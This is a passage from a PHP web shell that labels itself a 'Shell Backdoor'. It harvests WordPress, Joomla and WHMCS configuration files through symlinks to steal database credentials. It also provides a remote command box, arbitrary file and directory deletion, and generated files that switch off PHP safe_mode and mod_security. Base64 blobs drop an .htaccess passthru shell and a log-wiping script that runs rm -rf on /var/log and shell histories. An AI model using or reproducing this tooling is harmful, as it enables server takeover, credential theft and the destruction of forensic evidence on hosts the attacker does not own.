@symlink('/home/'.$user.'/public_html/db.php',$user.'-dbconf.txt');
@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-wp-site.txt');
@symlink('/home/'.$user.'/public_html/main/wp-config.php',$user.'-wp-main.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-wp-test.txt');
@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-joomla2.txt');
@symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-joomla-protal.txt');
@symlink('/home/'.$user.'/public_html/joo/configuration.php',$user.'-joo.txt');
@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-joomla-cms.txt');
@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-joomla-site.txt');
@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-joomla-main.txt');
@symlink('/home/'.$user.'/public_html/news/configuration.php',$user.'-joomla-news.txt');
@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-joomla-new.txt');
@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-joomla-home.txt');
@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vb-config.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm15.txt');
@symlink('/home/'.$user.'/public_html/central/configuration.php',$user.'-whm-central.txt');
@symlink('/home/'.$user.'/public_html/whm/whmcs/configuration.php',$user.'-whm-whmcs.txt');
@symlink('/home/'.$user.'/public_html/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmc/WHM/configuration.php',$user.'-whmc-WHM.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-whmcs.txt');
@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-support.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-joomla.txt');
@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-whmcs2.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm.txt');}
echo '<b class="cone"><font face="Tahoma" color="#00dd00" size="2pt"><b>Done -></b> <a target="_blank" href="explodedcgrab">Open configs</a></font></b>';}
}
   ////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'about'))
    {@ini_set('output_buffering',0); 
		echo "
<table style=width:100%; border=0 class=tabnet cellpadding=3 cellspacing=1 align=center>

	<tr>
	<td valign=top bgcolor=#151515 class=style2 style=width: 139px>
	<center><b><font size=5 style=italic color=#00ff00>About</font></b></center></td></tr></table>
";
    ?><form action="?y=<?=$pwd; ?>&x=about" method="post"><center><br><br><div class='msupiani'><img src='http://oi58.tinypic.com/2u8fmnn.jpg'/></div>
<br><br><br><font size="10" color="#00ff00"><b>Thanks To :</b><br><br><br></font></center><center><marquee direction="up" scrollamount="2" bgcolor="" width="250" height="100"><center>
<p><b><font size="3" color="#00ff00">Allah S.W.T<br><br>My Parent<br>Yulia Susanti<br>All Member Security Exploded<br>1N73CTION<br>B374K<br>AnonGhost<br>WSO<br>C100<br>BlackShadow<br>Madspot<br><br>
=[ Grub & Forum ]=<br><br>Pentest & Security Indonesia<br>Kali Linux Indonesia<br>Surabaya Black Hat<br>Indonesian Backtrack Team<br><br><br><br>By<br>Security Exploded a.k.a ./Port22<br><br>Special Present To :<BR><center><img src="http://www.clker.com/cliparts/W/q/D/p/e/7/small-red-heart-with-transparent-background-hi.png" width='20' height='20'></center>Yulia Susanti<br><br>18 Mar 2014<br>
</font></b></p></center></marquee></center><embed src="<?=$music;?>" autostart="TRUE" loop="TRUE" width="0" height="0"></embed><br><br><br>
<?php
}
/////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'shell')){  ?><form action="?y=<?=$pwd; ?>&amp;x=shell" method="post"><table class="cmdbox">
<tr><td colspan="2"><textarea class="output" readonly><?php if(isset($_POST['submitcmd'])) { echo @exe($_POST['cmd']);} ?></textarea>
<tr><td colspan="2"><?=$prompt; ?><input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" /><input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:12%;" /></td></tr>
</table></form><?php } 
else { 
if(isset($_GET['delete']) && ($_GET['delete'] != "")){
	$file = $_GET['delete'];
	@unlink($file);
}
elseif(isset($_GET['fdelete']) && ($_GET['fdelete'] != "")){
	@rmdir(rtrim($_GET['fdelete'],DIRECTORY_SEPARATOR));
}
elseif(isset($_GET['mkdir']) && ($_GET['mkdir'] != "")){
	$path = $pwd.$_GET['mkdir'];
	@mkdir($path);
}
	$buff = showdir($pwd,$prompt);
	echo $buff;
}
//////////////////////////////////////
?>
<br><table class="tabnet" >
<tr><form method="post" action="">&nbsp;<td><select class="inputzbut" align="left"  name="pilihan" id="pilih"><option value=""selected>------[ Select Your Favorit Tools ]------</option><option value="htasell">htaccess Shell [ .htaccess ]</option><option value="slc" >Server Log Cleaner [ serverLC.sh ]</option><option value="ini">Bypass Disable Function in Apache</option><option value="inis">Bypass Disable Function in Litespeed</option></select>
<input  type="submit" name="submites" class="inputzbut" value="Created">
</td></form></tr></table>
<?php
$submit = $_POST ['submites'];
if(isset($submit)) {
	$pilih = $_POST['pilihan'];
		if ( $pilih == 'ini') {
			$byphp = "safe_mode = Off \n disable_functions = None \n safe_mode_gid = OFF \n open_basedir = OFF \n allow_url_fopen = On";
			$byht = "<IfModule mod_security.c> \n SecFilterEngine Off \n SecFilterScanPOST Off \n  SecFilterCheckURLEncoding Off \n  SecFilterCheckUnicodeEncoding Off \n  </IfModule>";
			$iniphp = '<? \n echo ini_get("safe_mode"); \n echo ini_get("open_basedir"); \n include($_GET["file"]); \n ini_restore("safe_mode"); \n ini_restore("open_basedir"); \n echo ini_get("safe_mode"); \n echo ini_get("open_basedir"); \n include($_GET["ss"]; \n ?>';
			file_put_contents("php.ini",$byphp);
			file_put_contents(".htaccess",$byht);
			file_put_contents("ini.php",$iniphp);
			echo "<script>alert('Disable Functions in Apache Created'); hideAll();</script>";
die();
		}
		elseif ( $pilih == 'inis') {
		$iniph = '<?php \n echo ini_get("safe_mode"); \n echo ini_get("open_basedir"); \n include($_GET["file"]); \n ini_restore("safe_mode"); \n ini_restore("open_basedir"); \n echo ini_get("safe_mode"); \n echo ini_get("open_basedir"); \n include($_GET["ss"]; \n ?>';
			 $byph = "safe_mode = Off \n disable_functions= ";
		$comp="PEZpbGVzICoucGhwPg0KRm9yY2VUeXBlIGFwcGxpY2F0aW9uL3gtaHR0cGQtcGhwNA0KPC9GaWxlcz4=";
		file_put_contents("php.ini",base64_decode($byph));
		file_put_contents("ini.php",base64_decode($iniph));
		file_put_contents(".htaccess",base64_decode($comp));
		echo "<script>alert('Disable Functions in Litespeed Created'); hideAll();</script>";
die();
		}
		
		elseif ( $pilih == 'slc') {
		$slc ="IyEvYmluL3NoDQojIFJlY29kZWQgQnkgLi9Qb3J0MjIgKE1TdXBpYW4pDQojIEdyMzN0eiA6IEFsbCBNZW1iZXJzIE9mIFNlY3VyaXR5IEV4cGxvZGVkDQojIGNobW9kIDA3NTUgc2VydmVyTEMuc2ggPj4gLi9zZXJ2ZXJMQy5zaA0KDQplY2hvICJbKl0gR29pbmcgVG8gRGVsZXRlIExvZyBTZXJ2ZXJzIC4uLiAiDQpmaW5kIC8gLW5hbWUgKi5iYXNoX2hpc3RvcnkgLWV4ZWMgcm0gLXJmIHt9IFw7DQpmaW5kIC8gLW5hbWUgKi5iYXNoX2xvZ291dCAtZXhlYyBybSAtcmYge30gXDsNCmZpbmQgLyAtbmFtZSAibG9nKiIgLWV4ZWMgcm0gLXJmIHt9IFw7DQpmaW5kIC8gLW5hbWUgKi5sb2cgLWV4ZWMgcm0gLXJmIHt9IFw7DQpybSAtcmYgL3RtcC9sb2dzDQpybSAtcmYgJEhJU1RGSUxFDQpybSAtcmYgL3Jvb3QvLmtzaF9oaXN0b3J5DQpybSAtcmYgL3Jvb3QvLmJhc2hfaGlzdG9yeQ0Kcm0gLXJmIC9yb290Ly5rc2hfaGlzdG9yeQ0Kcm0gLXJmIC9yb290Ly5iYXNoX2xvZ291dA0Kcm0gLXJmIC91c3IvbG9jYWwvYXBhY2hlL2xvZ3MNCnJtIC1yZiAvdXNyL2xvY2FsL2FwYWNoZS9sb2cNCnJtIC1yZiAvdmFyL2FwYWNoZS9sb2dzDQpybSAtcmYgL3Zhci9hcGFjaGUvbG9nDQpybSAtcmYgL3Zhci9ydW4vdXRtcA0Kcm0gLXJmIC92YXIvbG9ncw0Kcm0gLXJmIC92YXIvbG9nDQpybSAtcmYgL3Zhci9hZG0NCnJtIC1yZiAvZXRjL3d0bXANCnJtIC1yZiAvZXRjL3V0bXANCg0KZWNobyAiWypdIERvbmUgLiBHb29kIEx1Y2sgOyki";
		file_put_contents("serverLC.sh",base64_decode($slc));
		echo "<script>alert('Server Log Cleaner [ serverLC.sh ] Created'); hideAll();</script>";
		die();
		}
		elseif ( $pilih == 'htasell') {
		$ht = 'PEZpbGVzIH4gIl5cLmh0Ij4NCk9yZGVyIGFsbG93LGRlbnkNCkFsbG93IGZyb20gYWxsDQo8L2ZpbGVzPg0KQWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLXBocCAuaHRhY2Nlc3MNCiMgPD9waHAgcGFzc3RocnUoJF9HRVRbJ2NtZCddKTs/Pg0K';
		file_put_contents(".htaccess",base64_decode($ht));
		echo "<script>alert('htaccess Shell [ .htaccess ] Created : open in site/.htaccess?cmd= '); hideAll();</script>";
		die();
		}
		
	}
	
?><br><br> <div class="footer"><b style="color:$color;font-family:monotype corsiva;font-size:22;"><?=$title; ?> <?=$versi ?> Shell Backdoor</b></div>
<div class="jaya">  &copy; <?=date('Y',time()); ?> <a href=""><?=$xName ?></a></div></div>
</body>
</html>
